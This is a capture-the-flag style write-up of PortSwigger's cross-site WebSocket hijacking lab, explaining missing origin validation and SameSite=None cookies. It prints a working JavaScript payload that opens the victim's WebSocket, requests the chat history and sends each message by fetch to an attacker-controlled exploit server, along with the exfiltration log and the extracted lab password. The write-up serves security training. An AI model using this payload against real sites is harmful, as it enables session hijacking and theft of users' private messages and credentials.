# PortSwigger Lab: Cross-site WebSocket hijacking

**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Medium  
**Type:** WebSocket Security  
**Objective:** Exfiltrate victim's chat history via CSWSH and gain account access  
**Attack Result:** Credentials extracted and account compromised

---

## Attack Flow

```
WebSocket endpoint vulnerable → No CSRF token, SameSite=None
→ READY message reveals chat history
→ Origin validation missing (accepts any origin)
→ Create exploit from attacker server
→ Exfiltrate chat via fetch
→ Extract credentials from messages
→ Login to victim account
```

---

## 1. WebSocket History

![WebSocket connection history in Burp](image-1-websocket-history.png)

Live chat at `/chat` endpoint. No CSRF token in handshake.

READY message shown (used to retrieve chat history).

---

## 2. Normal Message

![WebSocket repeater with normal message](image-2-normal-message.png)

Sending a regular chat message via WebSocket repeater.

---

## 3. READY Message Discovery

![WebSocket repeater modified to READY](image-3-ready-message.png)

Change message to `READY` instead of JSON.

When sent, server responds with all previous chat messages.

This is the key to exfiltration.

---

## 4. Chat History Retrieval

![Server dumps all chat messages](image-4-chat-history.png)

Sending READY returns:

```json
{"user":"Hal Pline","content":"Hello, how can I help?"}
{"user":"You","content":"I forgot my password"}
{"user":"Hal Pline","content":"No problem carlos, it's z6609kwu42e7zznpnl3l"}
```

Chat contains the victim's password!

---

## 5. Cross-Origin WebSocket Test

![Edit WebSocket connection to change origin](image-5-websocket-edit.png)

Edit WebSocket connection (pencil icon).

Change Origin from:
```
Origin: https://0ae300d304df8b8485c58483009d00c3.web-security-academy.net
```

To attacker server:
```
Origin: https://exploit-0a5b004b045f8beb8568833c01d10068.exploit-server.net
```

Send READY message - no error. Server accepts it.

**No origin validation = vulnerable to CSWSH**

---

## 6. Exploit Payload

Store on exploit server:

```html
<script>
websocket = new WebSocket('wss://0ae300d304df8b8485c58483009d00c3.web-security-academy.net/chat')
websocket.onopen = start
websocket.onmessage = handleReply

function start(event) {
  websocket.send("READY");
}

function handleReply(event) {
  fetch('https://exploit-0a5b004b045f8beb8568833c01d10068.exploit-server.net/?'+event.data, {mode: 'no-cors'})
}
</script>
```

**How it works:**
1. Create WebSocket from attacker's domain
2. SameSite=None includes victim's session cookie
3. Send READY to get chat history
4. Fetch each message to attacker's server (exfiltration)

---

## 7. Extracted Credentials

From victim's access logs on exploit server:

```
GET /?{"user":"Hal Pline","content":"Hello, how can I help?"}
GET /?{"user":"You","content":"I forgot my password"}
GET /?{"user":"Hal Pline","content":"No problem carlos, it's z6609kwu42e7zznpnl3l"}
```

Decoded:
```
User: carlos
Password: z6609kwu42e7zznpnl3l
```

---

## 8. Login

![Login form with extracted credentials](image-7-login-carlos.png)

Navigate to `/login`:

```
Username: carlos
Password: z6609kwu42e7zznpnl3l
```

Account access gained.

---

## 9. Lab Solved

![Congratulations lab solved](image-8-lab-solved.png)

Lab completed successfully.

---

## Why It Works

- **SameSite=None:** Cookie sent cross-site automatically
- **No origin validation:** Server accepts any origin
- **READY message:** Dumps chat history on demand
- **Session persistence:** Browser includes cookie automatically
- **Fetch exfiltration:** mode: 'no-cors' bypasses CORS checks

---

## Key Concepts

### Cross-site WebSocket Hijacking (CSWSH)

Attacker-controlled JavaScript creates WebSocket connection to target.

If `SameSite=None`, victim's session cookie is included.

Server thinks request is legitimate (same cookies).

### Exfiltration via Fetch

```javascript
fetch(attacker_url + '?' + sensitive_data, {mode: 'no-cors'})
```

Sends data as URL parameter to attacker's server.

`mode: 'no-cors'` prevents CORS preflight, allowing cross-origin requests.

### Information Disclosure in Chat

Support agent revealed password in chat history.

READY message dumps all messages on demand.

---

## Comparison: WebSocket Labs

| Lab | Technique | Defense | Exploit Result |
|-----|-----------|---------|----------------|
| 8 | XSS injection | No filter | Alert popup |
| 9 | XSS + filter bypass | Aggressive filter | Alert popup |
| 10 | CSWSH + exfiltration | No origin validation | Credentials + account access |

---

## References

- [PortSwigger — CSWSH](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)
- [MDN — WebSocket API](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket)
- [OWASP — WebSocket Security](https://owasp.org/www-community/attacks/websocket_hijacking)
- [SameSite Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
